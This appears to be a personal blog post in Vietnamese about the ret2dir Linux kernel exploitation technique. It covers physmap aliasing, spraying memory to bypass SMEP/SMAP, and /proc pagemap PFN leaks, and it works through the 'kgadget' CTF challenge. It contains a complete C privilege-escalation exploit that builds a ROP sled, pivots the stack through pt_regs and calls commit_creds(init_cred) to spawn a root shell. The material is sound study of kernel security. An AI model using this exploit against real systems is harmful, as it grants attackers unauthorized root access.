@@ -1,0 +1,387 @@
+--- 
+title: Ret2dir
+date: 2025-11-2 00:00:00 +0800
+description: 'No description'
+tags: ['kernel','research']
+authors: ['kuvee']
+draft: false
+---
+
+These are personal notes, inspired by various sources, so they might not be entirely correct. Please overlook any mistakes ( and only vietnamese :D)
+
+
+- ret2dir: là một techinal được đề xuất vào năm 2014 . nó được dùng để bypass các cơ chế bảo vệ cô lập user-land khỏi kernel-land như SMEP , SMAP , PXN 
+
+- PXN (Privileged eXecute Never) : ở các version kernel cao thì PXN thường được bật -> không thể run shellcode trực tiếp mà cần dùng ROP , ... 
+
+- ta sẽ xem xét cách bố trị memory của kernel linux trên x86 : https://elixir.bootlin.com/linux/latest/source/Documentation/x86/x86_64/mm.rst
+
+có 1 vùng gọi là `direct mapping area` , vùng này giúp kernel luôn có 1 ánh xạ ảo ổn định , là `VA` của kernel ánh xạ 1-1 tới toàn bộ địa chỉ vật lý `PA` bằng 1 offset cố định
+
+- có nghĩa là với 1 khung trang vật lý đang được user's process sử dụng . sẽ tồn tại đồng thời 1 addr trong user-land và kernel-land cùng mapping tới chính khung trang vật lý đó , tức là nếu ta dùng hai địa chỉ này để truy cập thì đều chạm vào cùng 1 PA 
+
+```
+X (user VA, U=1)  ──>  PTE_user   ──>  Z (PA: trang vật lý)
+Y (kernel VA, U=0, thuộc physmap) ──> PTE_kernel ──>  Z (PA)
+```
+
+
+- khác với vmalloc (allocate 1 vùng virtual address không liên tục , còn physmap là ánh xạ tuyến tính , liên tục)
+
+SMAP cấm kernel access X khi ở ring0 , nhưng không cấm đụng Y (VA kernel) . vì vậy kernel có thể truy cập dữ liệu do user kiểm soát thông qua Y.
+
+- PTE (Page Table Entry) : với 4-level paging , 4 level : PGD -> PUD -> PMD -> PTE 
+
+PTE là ở level cuối , mapping 1 page 4KiB tới khung trang vật lý (PFN/PA) và chứa quyền truy cập
+
+
+nói tóm lại PTE quyết định 1 vir page sẽ map tới phy page và được phép làm gì 
+
+--------------------------
+
+
+- how to exploit: 
+
+    - sử dụng mmap để allocate 1 lượng lớn address vào user-space
+    - sử dụng các địa chỉ được leak để thực hiện searching memory , ta có thể tìm thấy memory đã đưa vào user-space
+
+
+- Điều quan trọng cần lưu ý là chúng ta thường không có cơ hội tìm kiếm trực tiếp. Do đó, chúng ta cần sử dụng mmap để spray một lượng lớn bộ nhớ vật lý với cùng một payload , sau đó chọn ngẫu nhiên một địa chỉ trên một vùng được ánh xạ tuyến tính để khai thác. Bằng cách này, chúng ta có khả năng cao sẽ tấn công trúng payload của mình 
+
+---------------------------
+
+- ta sẽ lấy 1 bài mẫu để exploit : https://arttnba3.cn/download/minil2022/pwn/kgadget.tar.xz
+
+challenge đơn giản là truyền `param` và call nó . 
+
+![image](https://hackmd.io/_uploads/H1D9XkrkZl.png)
+
+- run.sh : bài này sẽ có `smap` + `smep` nên đại loại là ta không làm những thứ như gọi `commit_cred(&init_cred)` 1 cách trực tiếp ở user-land được , tuy nhiên bài này  `kaslr` lại tắt
+
+
+```sh
+❯ cat run.sh
+#!/bin/sh
+set -e  
+
+
+EXP_BIN_PATH="/home/kuvee/kernel/ret2dir/exp"
+INITRD_ORIGIN="rootfs.cpio"
+INITRD_MODIFIED="new_rootfs.cpio"
+WORKING_DIR="rootfs_workdir"
+
+# === Build binary ===
+echo "[*] Building exploit..."
+gcc exp.c -o exp -static
+
+
+echo "[*] Preparing rootfs..."
+mkdir -p "$WORKING_DIR"
+cd "$WORKING_DIR"
+
+
+cpio -idv < "../$INITRD_ORIGIN"
+
+
+cp "$EXP_BIN_PATH" ./bin/
+
+
+echo "[*] Repacking new initrd..."
+find . -print0 | cpio -o --format=newc --null --owner=root > "../$INITRD_MODIFIED"
+
+cd ..
+rm -rf "$WORKING_DIR"
+
+# run qemu
+echo "[*] Launching QEMU..."
+qemu-system-x86_64 \
+    -m 256M \
+    -cpu kvm64,+smep,+smap \
+    -smp cores=2,threads=2 \
+    -kernel bzImage \
+    -initrd "$INITRD_MODIFIED" \
+    -nographic \
+    -monitor /dev/null \
+    -snapshot \
+    -append "console=ttyS0 nokaslr pti=on quiet oops=panic panic=1" \
+    -no-reboot \
+    -gdb tcp::12345
+
+```
+
+- ở bài này , ta sẽ access trực tiếp dữ liệu ở user-land thông qua 1 địa chỉ nằm trong kernel (direct mapping area) , mọi page mà ta allocate cho user-land đều có thể truy cập từ kernel-land thông qua vùng memory này , vì vậy ta chỉ cần đặt payload ở user-land và tìm địa chỉ kernel tương ứng ( `ret2dir`)
+
+- tuy nhiên thì ở bài này ta không thể tìm được chính xác địa chỉ đó , vì vậy author đã đề cập đến 1 kĩ thuật có tên `inject mmap` , có nghĩa là ta sẽ spray 1 lượng lớn physical memory với cùng 1 payload , sau đó peek đại 1 addr và tỉ lệ khá cao nó sẽ dính :v   http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf
+
+
+- có 1 điều đáng chú ý ở đây là như trong hình `0xffff888007000000` là địa chỉ physmap , nó sẽ chứa gadget mà mình đã setup sẵn , nó có thể là chuỗi `rop` , nhưng như vậy thì tỉ lệ sẽ khá thấp , nên ta cần có một cần dùng `rop_sled` , ta sẽ đặt 1 số `ret` để nó rơi đúng vào `rop-chain` mà ta đã setup
+
+
+![image](https://hackmd.io/_uploads/SkKa9yr1Zg.png)
+
+- tuy nhiên stack sau khi ret thì nó sẽ ret vào 1 cái gì đó không biết trước được , nên ta phải cần setup thêm `pt_regs` để pivot stack thành địa chỉ physmap chứa các gadget 
+
+![image](https://hackmd.io/_uploads/SJnpiJSy-g.png)
+
+- nó sẽ trông như sau: 
+
+trông khá giống ret2spill ... 
+
+```
+  asm volatile(".intel_syntax noprefix;"
+               "mov r15,   0xbeefdead;"
+               "mov r14,   0x11111111;"
+               "mov r13,   0x22222222;"
+               "mov r12,   0x33333333;"
+               "mov rbp,   0x44444444;"
+               "mov rbx,   0x55555555;"
+               "mov r11,   0x66666666;"
+               "mov r10,   0x77777777;"
+               "mov r9,    pop_rsp;" // stack migration again
+               "mov r8,    try_addr;"
+               "mov rax,   0x10;"
+               "mov rcx,   0xaaaaaaaa;"
+               "mov rdx,   try_addr;"
+               "mov rsi,   0x1bf52;"
+               "mov rdi,   fd;"
+               "syscall;"
+               ".att_syntax");
+```
+
+và ta cũng cần tìm 1 gadget thích hợp và tính khoảng cách mà nó pivot , ở bài này là `add rsp,0xa0`
+
+- sau khi pivot thành công thì nó sẽ như sau: 
+
+![image](https://hackmd.io/_uploads/rJp03kHk-e.png)
+
+- và cuối cùng đơn giản là nó sẽ ret cho đến khi gặp rop-chain mà ta đã đặt ở user-land
+
+exp: 
+
+```c
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <unistd.h>
+
+typedef uint64_t u64;
+typedef int64_t i64;
+#define vuln "/dev/kgadget"
+const u64 commit_cred = 0xffffffff810c92e0;
+const u64 init_creds = 0xffffffff82a6b700;
+const u64 swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00fb0 + 27;
+const u64 pop_rdi = 0xffffffff819cbd8c;
+const u64 pop_rax = 0xffffffff81bb6244;
+const u64 pop_rsp = 0xffffffff81b98dae;
+
+const u64 add_rsp_0xe8_pop_rbx_pop_rbp_ret = 0xffffffff812bd353;
+const u64 add_rsp_0xd8_pop_rbx_pop_rbp_ret = 0xffffffff810e7a54;
+const u64 add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = 0xffffffff810737fe;
+const u64 ret = 0xffffffff8108c6f1;
+u64 try_addr;
+u64 user_cs, user_ss, user_sp, user_rflag;
+u64 *spray_physmap[20000];
+// 20000 * 4  = ~78Mib
+// VA_kernel (physmap) = page_offset_base + (PFN << 12) = 0xffff888000000000 +
+// 0x07000000
+void save_state() {
+  puts("[*] save state");
+  asm volatile(".intel_syntax noprefix;"
+               "mov user_cs,cs;"
+               "mov user_ss,ss;"
+               "mov user_sp,rsp;"
+               "pushf;"
+               "pop user_rflag;"
+               ".att_syntax");
+  puts("[*] save state success");
+}
+void get_shell() {
+  puts("[*] i'm in get_shell");
+  if (getuid() == 0) {
+    puts("[+] root right now");
+    execl("/bin/sh", "-sh", 0);
+  } else {
+    puts("no luck");
+  }
+  exit(0);
+}
+// 0 -> 463 add
+// 464 -> 495 ret
+// 496 -> 511 rop
+void build_ROP_sled(u64 *rop) {
+  int i = 0;
+  for (; i < (0x1000 / 8 - 0x30); i++) {
+    rop[i] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;
+  }
+  for (; i < (0x1000 / 8 - 0x10); i++) {
+    rop[i] = ret;
+  }
+  rop[i++] = pop_rdi;
+  rop[i++] = init_creds;
+  rop[i++] = commit_cred;
+  rop[i++] = swapgs_restore_regs_and_return_to_usermode;
+  rop[i++] = *(u64 *)"kuvee";
+  rop[i++] = *(u64 *)"kuvee";
+  rop[i++] = (u64)get_shell;
+  rop[i++] = user_cs;
+  rop[i++] = user_rflag;
+  rop[i++] = user_sp;
+  rop[i++] = user_ss;
+}
+
+int fd;
+int main() {
+  save_state();
+  fd = open(vuln, O_RDWR);
+  if (fd < 0) {
+    perror("open");
+    exit(-1);
+  }
+  puts("[*] spraying physmap");
+  spray_physmap[0] = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  printf("physmap addr: 0x%lx\n", spray_physmap[0]);
+  build_ROP_sled(spray_physmap[0]);
+  for (int i = 1; i < 19000; i++) {
+    spray_physmap[i] = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (!spray_physmap[i]) {
+      perror("mmap");
+      exit(0);
+    }
+    memcpy(spray_physmap[i], spray_physmap[0], 0x1000);
+  }
+  puts("[*] trigger physmap");
+  try_addr = 0xffff888000000000 + 0x7000000;
+  asm volatile(".intel_syntax noprefix;"
+               "mov r15,   0xbeefdead;"
+               "mov r14,   0x11111111;"
+               "mov r13,   0x22222222;"
+               "mov r12,   0x33333333;"
+               "mov rbp,   0x44444444;"
+               "mov rbx,   0x55555555;"
+               "mov r11,   0x66666666;"
+               "mov r10,   0x77777777;"
+               "mov r9,    pop_rsp;" // stack migration again
+               "mov r8,    try_addr;"
+               "mov rax,   0x10;"
+               "mov rcx,   0xaaaaaaaa;"
+               "mov rdx,   try_addr;"
+               "mov rsi,   0x1bf52;"
+               "mov rdi,   fd;"
+               "syscall;"
+               ".att_syntax");
+  return 0;
+}
+
+```
+
+- còn 1 phương pháp được đề cập là `Leak PFNs via Procfs` nhưng cái này có lẽ chỉ dùng được với version kernel cũ hơn (không read PFS được từ Procfs mà không có quyền `CAP_SYS_ADMIN`)
+
+- với mỗi page user-land , `proc/pid/pagemap` cung cấp 1 giá trị 64bit : 
+
+```
+bit 63 : page đang map
+bit 0..54: PFN (Page Frame Number)
+```
+
+- dựa trên các số này , ta có thể tính toán địa chỉ đồng nghĩa của 1 virtual addr ở userlandd
+
+
+```
+PFN(uaddr) = pagemap[(uaddr / 4096) * sizeof(uint64_t)][0:54]
+SYN(uaddr) = PHYS_OFFSET + 4096 * (PFN(uaddr) - PFN_MIN)
+```
+
+ta cần biết `uaddr : địa chỉ được mmap` , từ `uaddr` ta sẽ read `/proc/pid/pagemap` để lấy PFN (Page Frame Number) , biết PFN rồi thì địa chỉ alias trong kernel (physmap):
+
+```
+VA_physmap = page_offset_base + (PFN << 12)         // x86-64, PFN_MIN = 0
+```
+
+vd: ta `mmap` thành công : 
+
+```
+uaddr = 0x7f1234567000
+```
+
+`offset = (0x7f1234567000 >> 12) * 8 = 0x3f891a2b38` sau đó đọc 8 bytes tại offset này : 
+
+```
+entry = 0x80000000001D3A5B
+
+Bit 63 = 1 -> Present.
+
+PFN = entry & ((1<<55)-1) = 0x001D3A5B.
+```
+
+nếu `page_offset_base = 0xffff888000000000` với KASLR được tắt thì `va_physmap` sẽ như sau: 
+
+```
+va_physmap = 0xffff888000000000 + (0x001D3A5B << 12)
+           = 0xffff8881d3a5b000
+```
+
+example: 
+
+```c
+#include <stdint.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/mman.h>
+#include <stdio.h>
+
+static uint64_t read_pfn(void *uaddr) {
+    const long ps = sysconf(_SC_PAGESIZE);           // 4096
+    const off_t off = ((uintptr_t)uaddr / ps) * 8;   // offset trong pagemap
+    uint64_t entry = 0;
+    int fd = open("/proc/self/pagemap", O_RDONLY);
+    if (fd < 0) { perror("open pagemap"); return 0; }
+    if (pread(fd, &entry, 8, off) != 8) { perror("pread"); close(fd); return 0; }
+    close(fd);
+    if (!(entry & (1ULL<<63))) {                     // bit Present
+        fprintf(stderr, "page not present\n");
+        return 0;
+    }
+    return entry & ((1ULL<<55) - 1);                 // PFN
+}
+
+int main() {
+    size_t ps = sysconf(_SC_PAGESIZE);
+    uint8_t *p = mmap(NULL, ps, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    p[0] = 0x41;                                     // fault-in để Present=1
+
+    uint64_t pfn = read_pfn(p);
+    printf("uaddr=%p  PFN=0x%llx\n", p, (unsigned long long)pfn);
+
+    // Nếu biết base physmap:
+    uint64_t page_offset_base = 0xffff888000000000ULL;
+    uint64_t physmap_va = page_offset_base + (pfn << 12);
+    printf("physmap alias = 0x%llx\n", (unsigned long long)physmap_va);
+}
+```
+
+
+
+
+ 
+
+ref : 
+
+https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir
+
+https://ret2school.github.io/post/iwindow/
+
+
+
+https://www.blackhat.com/docs/eu-14/materials/eu-14-Kemerlis-Ret2dir-Deconstructing-Kernel-Isolation.pdf
+
+https://ctftime.org/writeup/16080
+
+https://blog.zolutal.io/understanding-paging/
+
+https://blog.wohin.me/posts/linux-kernel-pwn-05/
